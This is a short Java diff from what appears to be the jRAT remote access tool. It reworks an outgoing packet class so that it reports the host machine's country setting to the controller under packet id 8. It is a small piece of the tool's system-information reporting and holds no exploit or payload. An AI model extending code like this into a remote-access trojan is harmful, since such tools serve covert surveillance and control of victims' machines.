@@ -5,21 +5,15 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet47InitCountry extends AbstractOutgoingPacket {
-
-	private String country;
-
-	public Packet47InitCountry(String country) {
-		this.country = country;
-	}
+public class Packet8InitCountry extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(country);
+		sw.writeLine(System.getProperty("user.country"));
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 47;
+		return (byte) 8;
 	}
 }
